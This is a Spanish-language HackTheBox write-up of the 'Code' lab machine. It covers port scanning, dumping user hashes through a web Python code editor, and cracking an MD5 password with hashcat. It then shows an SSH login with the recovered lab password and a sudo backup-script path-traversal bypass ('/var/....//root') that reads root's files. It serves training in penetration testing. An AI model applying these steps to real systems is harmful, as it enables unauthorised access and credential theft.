---
title: "HackTheBox - Code"
date: 2025-04-01
platform: "hackthebox"
logo: "/images/htb.png"
tags: ["Linux", "Gunicorn", "Python-RCE", "MD5-Cracking", "Sudo-Abuse", "Path-Traversal"]
summary: "Resolución de la máquina Code. Explotaremos un editor de código Python para extraer credenciales de una base de datos, realizaremos cracking de hashes MD5 y escalaremos privilegios abusando de un script de backup vulnerable a Path Traversal."
draft: false
---
Esta es la maquina [[Code]] de [[HackTheBox]] en esta maquina lo que vamos a realizar es lo siguientes conceptos:

### Resumen de Técnicas Usadas

| **Técnica**                             | **Herramienta/Concepto**                       |
| --------------------------------------- | ---------------------------------------------- |
| **Escaneo de Red y Enumeración**        | [[Nmap]], [[WhatWeb]]                          |
| **Reconocimiento de Servicios**         | **[[Nmap]] -sCV**, [[Firefox]]                 |
| **RCE (Ejecución Remota de Código)**    | **Explotación** del **[[Python]] Code Editor** |
| **Extracción y Cracking de Hashes**     | **[[Hashcat]]**, [[Hash MD5]] **Cracking**     |
| **Acceso SSH con Credenciales Robadas** | **[[SSH]] Login**                              |
| **Enumeración de Privilegios**          | **sudo -l**, **lsb_release -a**                |
| **Explotación de Tareas Programadas**   | **backy.sh** **abuse**  **[[Bash]]**           |
| **Escalada de Privilegios**             | **Path Traversal, Tar Extraction**             |

---

Para empezar por la maquina lo que primero realizamos es la creación de nuestro entorno de trabajo con los siguientes comandos :

```sh title:Shell
mkdri Code
cd Code
mkt 

#Crea las siguientes Carpetas

 which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
```

Después de crear nuestro entorno de trabajo lo que procedemos hacer es saber a que tipo de [[Sistema Operativo]] nos estamos enfrentando, ya sea [[Linux]] o [[Windows]], para saber esta información nos podríamos guiar por el [[TTL]] que nos da al realizar un [[Ping]] a la **Maquina Victima** aunque este se podría cambiar pero en [[HackTheBox]] no es el caso.

```r title:Ping
❯ ping -c 1 10.10.11.62
PING 10.10.11.62 (10.10.11.62) 56(84) bytes of data.
64 bytes from 10.10.11.62: icmp_seq=1 ttl=63 time=326 ms

--- 10.10.11.62 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 326.202/326.202/326.202/0.000 ms
```

Por lo que podemos ver el [[TTL]] de la *maquina* esta mas cerca de los **64=[[Linux]]** que los 128=[[Windows]]

Pero esto después dentro de la maquina lo podremos comprobar *mejor* con **lsb_release -a**.

Una vez creado el **entorno de trabajo** lo ahora empezaremos con la **enumeración** de con [[Nmap]

---

## Uso de  [[Nmap]

A continuación nos meteremos en la carpeta anteriormente creada llamada [[Nmap] :

```r title:Shell
❯ cd nmap/
```

Una vez dentro de la carpeta [[Nmap] empieza la **enumeración** para reconocer los [[Puerto]]s que están abiertos en el la **Maquina Victima** con el siguiente comando:

```r title:Nmap
❯ nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.11.62 -oG allPorts
```

Una vez realizado el primer **escaneo** de la **Maquina Victima** lo que procedemos a hacer es la *extracción* de todos los puertos que nos proporciono dicho **escaneo**,. 

La *extracción* de los [[Puerto]]s que nos proporciono el primer comando lo haremos con una función que tenemos implementada en la [[zshrc]] llamada [[ExtractPorts]] la que hace lo siguiente:

```r title:ExtractPorts
❯ extractPorts allPorts
	│ File: extractPorts.tmp
	│ 
	│ [*] Extracting information...
	│ 
	│     [*] IP Address: 10.10.11.62
	│     [*] Open ports: 22,5000
	│ 
	│ [*] Ports copied to clipboard
	│ 
```

Con lo que nos proporciono podremos ya realizar el siguiente **escaneo** con [[Nmap] :

```r title:Nmap
❯ nmap -p22,5000 -sCV 10.10.11.62 -oN targeted
```

Este **[[Escaneo de Servicios]]** nos proporciona una **mejor** descripción de los **servicios** que están corriendo en los [[Puerto]]s **abiertos**, con un **cat** podremos ver la *información* que nos proporciono este **escaneo**:  

```r 
 ❯ cat targeted -l java
	│ File: targeted
	│ # Nmap 7.94SVN scan initiated Tue Apr  1 07:56:15 2025 as: nmap -p22,5000 -sCV -oN targeted 10.10.11.62
	│ Nmap scan report for 10.10.11.62
	│ Host is up (0.34s latency).
	│ 
	│ PORT     STATE SERVICE VERSION
	│ 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
	│ | ssh-hostkey: 
	│ |   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
	│ |   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
	│ |_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
	│ 5000/tcp open  http    Gunicorn 20.0.4
	│ |_http-title: Python Code Editor
	│ |_http-server-header: gunicorn/20.0.4
	│ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	│ 
	│ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	│ # Nmap done at Tue Apr  1 07:56:34 2025 -- 1 IP address (1 host up) scanned in 20.01 seconds
```

Vemos que en esta **Máquina** esta abierto un [[Puerto]] el cual no sabemos cual es y que hace por lo que haremos a continuación es hacer una búsqueda de que es **[[Gunicorn]]**.

---
## Búsqueda de Información Por [[Firefox]]

Con esto lo que podemos presenciar es un [[Servicio]] nuevo que nunca hemos visto antes que se llama [[Gunicorn]], por lo tanto realizaremos una búsqueda en [[Firefox]] sobre que es [[Gunicorn]] y saber que los posibles tipos de **vulnerabilidad** tiene.

Resumen de lo que nos salio en el [[Firefox]]:

- Que es [[Gunicorn]]?
El [[Gunicorn]] "Green Unicorn" es un [[servidor]] [[HTTP]] de interfaz de puerta de enlace de [[servidor]] web [[Python]]. Es un modelo de trabajador previo a la bifurcación, adaptado del proyecto Unicorn de [[Ruby]].

- gunicorn@20.0.4 vulnerabilities
https://security.snyk.io/package/pip/gunicorn/20.0.4

Lo que dice la pagina de Proporcionada es lo siguiente:

En resumen, el texto describe dos vulnerabilidades relacionadas con **[[Gunicorn]]**, un servidor [[HTTP]] para aplicaciones [[Python]] en [[UNIX]].

1. **[[HTTP]] Request [[Smuggling]] ([[Smuggling]] de solicitudes [[HTTP]])**: Las versiones vulnerables de [[Gunicorn]] no validan correctamente el encabezado **Transfer-Encoding**, lo que permite a un atacante manipular los datos de la sesión, envenenar cachés o comprometer la integridad de los datos. Esto se debe a un comportamiento incorrecto cuando **Transfer-Encoding** no se maneja correctamente y el servidor recurre al **Content-Length**. Se recomienda **actualizar a la versión 23.0.0 o superior** para corregir esto.

2. **Comprobación Incorrecta de Condiciones Inusuales**: Las versiones afectadas utilizan la función **time.time()** para gestionar los tiempos de espera de los trabajadores, lo cual es vulnerable si un atacante controla el reloj del sistema, ya que podría forzar un **timeout**. Esto se puede solucionar actualizando a **la versión 21.2.0 o superior**.

**Recomendación general**: Se debe actualizar [[Gunicorn]] a versiones seguras (21.2.0 o superior para el segundo problema y 23.0.0 o superior para el primero) y, en el caso de [[HTTP]] Request Smuggling, proteger los puntos finales restringidos con un [[firewall]] hasta que se resuelva el problema.

---
## Uso de [[WhatWeb]]

Para poder seguir enumerando podemos utilizar [[WhatWeb]] para saber los distintos servicios que puede ser que estén corriendo por detrás de la pagina web que esta creada y que no se vieron anteriormente: 

```r title:WhatWeb
❯ whatweb -v http://10.10.11.62:5000
WhatWeb report for http://10.10.11.62:5000
Status    : 200 OK
Title     : Python Code Editor
IP        : 10.10.11.62
Country   : RESERVED, ZZ

Summary   : HTML5, HTTPServer[gunicorn/20.0.4], JQuery[3.6.0], Script

Detected Plugins:
[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	String       : gunicorn/20.0.4 (from server string)

[ JQuery ]
	A fast, concise, JavaScript that simplifies how to traverse 
	HTML documents, handle events, perform animations, and add 
	AJAX. 

	Version      : 3.6.0
	Website     : http://jquery.com/

[ Script ]
	This plugin detects instances of script HTML elements and 
	returns the script language/type. 


HTTP Headers:
	HTTP/1.1 200 OK
	Server: gunicorn/20.0.4
	Date: Tue, 01 Apr 2025 09:52:16 GMT
	Connection: close
	Content-Type: text/html; charset=utf-8
	Content-Length: 3435
	Vary: Cookie
```

Con esto podemos ver mas al detalle lo que tiene la pagina web.

---
## Explotación del Editor de el  [[Python]] Code Editor

En la [[URL]] del navegador [[Firefox]] ponemos la [[IP]] y el [[Puerto]] en el que esta alogado la pagina web del [[Python]] Code Editor:

`{r title:URL}http://10.10.11.62:5000/`
`

Una vez dentro de la **pagina web** lo que vemos es lo siguiente:
![[Pasted image 20250401110604.png]]

Con esto nos podemos plantear intentar hacer **Código** con este por si es **vulnerable**.

Y uno que podemos hacer es un **código** que escriba los datos que tiene en la [[Databases]] 

```py title:Python
print([(user.id, user.username, user.password) for user in User.query.all()])
```

![[Pasted image 20250403080030.png]]

Y podemos ver los datos y con ello podemos ver que que son *datos* que están **encriptado** y que podemos crear un **.txt** con las credenciales para tenerlas seguras en nuestro **equipo** .

```r title:usuario.txt
❯ cat usuarios.txt -l java
	File: usuarios.txt
{␍
	"output": "[(1, 'development', '759b74ce43947f5f4c91aeddc3e5bad3'), (2, 'martin', '3de6f30c4a09c27fc71932bfc68474be')]\n"␍
}		
```

---
## Uso de [[Hashcat]]

Ahora sabiendo que tenemos **usuario potenciales** para iniciar una sesión con [[SSH]] lo que haremos es usar [[Hashcat]] para desencriptar las *contraseñas* **Hasheadas**.

Y el que nos interesa a nosotros es el Usuario de **Martin** y con el siguiente comando conseguiremos averiguar que tipo es el [[Hash]].

```r title:Hashcat
❯ hashcat "3de6f30c4a09c27fc71932bfc68474be"

#Texto que nos proporciona Hashcat

The following 11 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)
```

Con el texto que nos proporciona [[Hashcat]] podemos saber los posibles tipo de [[Hash]] se han utilizado para **hashear** la *contraseña* de **Martin** 

### Uso de [[Hash MD5]]

Usaremso el [[Hashcat]] para Deshashear la contraseña Hasheada con valor [[Hash MD5]], ya que es de las mas famosas y si esta no nos deja probaremos con [[Hash MD4]].

```r title:HashCat
❯ hashcat -m 0 "3de6f30c4a09c27fc71932bfc68474be" /usr/share/wordlists/rockyou.txt --force

#Saldra la contraseña pero para verlo la contraseña que nos proporciono podemos usar lo siguinete:

❯ hashcat -m 0 "3de6f30c4a09c27fc71932bfc68474be" --show
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
```

Como podemos ver [[Hashcat]] no dio la *contraseña* que tenia el usuario **Martin** lo que procedemos a copiarla y ponerla en un **.txt**

```r title:Credenciales.txt
❯ cat Credenciales.txt
	File: Credenciales.txt
Martin:3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
```

Ya con esto podemos usar las **credenciales** guardadas para entrar en [[SSH]] con el siguiente comando :

```r title:SSH 
❯ ssh martin@10.10.11.62
martin@10.10.11.62's password: 'nafeelswordsmaster'

```

Una vez dentro del sistema deberemos poner los valores para que la [[Terminal]] tenga las mismas configuraciones que nuestra [[Terminal]] 

```r title:Config_terminal
martin@code:~$ export TERM=xterm
martin@code:~$ stty rows 84 columns 154
```

Con estos valores podremos hacer CTRL + L y se limpiara la [[terminal]] y diversas funciones mas, aparte de configuración de la escala de la [[Terminal]]

---
## Investigación dentro del Sistema Victima

Podemos confirmar la version de Ubuntu que es la maquina 

```r title:Version_Linux
martin@code:~/backups$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.6 LTS
Release:	20.04
Codename:	focal
```


Ahora que estamos dentro del **sistema** del la **maquina victim**a podemos ver con el siguiente *comando* si tienen **permisos** en algún *archivo* y **examinar** este para ver si podemos hacer algo para coger la la **flag** del *usuario* y si es posible al del **root**

```r title:SSH
martin@code:~/backups$ sudo -l 
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
martin@code:~/backups$ 
```

---
## Acceder al User.txt

Como pudimos ver el *usuario* **Martin** tiene privilegios de **Sudoers** en un *archivo* alojado en */usr/bin/backy.sh* que al *examinarlo* podemos ver lagunas cosas interesantes en el:

```r title:Backy.sh
martin@code:/usr/bin$ ls | grep 'backy.sh'
backy.sh
martin@code:/usr/bin$ cat backy.sh 
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
martin@code:/usr/bin$ 
```

Lo que podemos ver es que esto lo que hace es hacer un archivo **Task.json** que lo que realiza en un BackUp. 

Si miramos el **Task.json** veremos que hace en cuestión. 

```r title:Task.json
martin@code:~/backups$ cat task.json
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
```

Lo que podemos hacer ahora es ejecutar el **backy.sh** pero antes deberíamos cambiar el archivo **task.json** que es el que nos dice donde se *almacenara* la **backup** y que queremos que se haga dicho **backup** y no genere 

```r title:Task.json
{
	"destination": "/home/martin/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/user.txt"
	],

	"exclude": [
		".*"
	]
}
```

Y procedemos a ver lo que nos genero :

```r title:user.txt
martin@code:~$ ls
backups  code_home_app-production_user.txt_2025_April.tar.bz2
martin@code:~$ tar -xjf code_home_app-production_user.txt_2025_April.tar.bz2
martin@code:~$ ls
backups  code_home_app-production_user.txt_2025_April.tar.bz2  home
martin@code:~$ cd home/
martin@code:~/home$ ls
app-production
martin@code:~/home$ cd app-production/
martin@code:~/home/app-production$ ls
user.txt
martin@code:~/home/app-production$ cat user.txt 
# Se ve la Flag del usuario.
```

---
##  Acceder al Root

Ahora que conseguimos la **Flag** de el usuario lo que procedemos hacer es intentar conseguir la **flag** del *usuario* **Root**, con ello lo que podemos hacer es modificar de nuevo el **Task.json** de una manera que pase por los *directorios* y llegue al **root.txt**

En el **backy.sh** pudimos ver antes que lo mas profundo que se podría ir era al */var* o */home* lo que vamos hacer es probar por el *directorio* */var*, ya que este se aloja de **default** en la directiva del **root** y retrocediendo podemos llegar a un punto para coger la **flag** de **root**

```r title:Task.json
{
        "destination": "/home/martin/",
        "multiprocessing": true,
        "verbose_log": true,
        "directories_to_archive": [
                "/var/....//root"
        ],

        "exclude": [
                ".*"
        ]
}
```

Y procedemos a ver lo que nos genero :

```r title:root.txt
martin@code:~$ ls
backups  code_var_…_root_root.txt_2025_April.tar.bz2
martin@code:~$ tar -xjf code_var_…_root_root.txt_2025_April.tar.bz2
martin@code:~$ ls
backups  code_var_…_root_root.txt_2025_April.tar.bz2  root
martin@code:~/home$ cd root/
martin@code:~/home/app-production$ ls
root.txt
martin@code:~/home/app-production$ cat root.txt 
# Se ve la Flag del root.
```

